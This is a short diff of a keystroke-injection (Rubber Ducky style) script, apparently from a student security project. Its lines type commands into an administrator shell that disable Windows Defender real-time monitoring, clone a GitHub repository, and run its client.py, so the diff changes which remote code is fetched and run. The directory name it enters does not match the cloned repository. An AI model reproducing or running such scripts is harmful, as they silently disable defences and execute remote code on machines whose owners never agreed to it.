@@ -9,11 +9,11 @@ STRING cd C:\\Users\\Administrator
 ENTER
 STRING Set-MpPreference -DisableRealtimeMonitoring 1
 ENTER
-STRING git clone https://github.com/DericM/COMP8506_ASN04
+STRING git clone https://github.com/Chris1Yuan/projectrubber.git
 ENTER
 DELAY 2000
 
-STRING cd COMP8506_ASN04
+STRING cd fianlproject
 ENTER
 
 STRING ./client.py
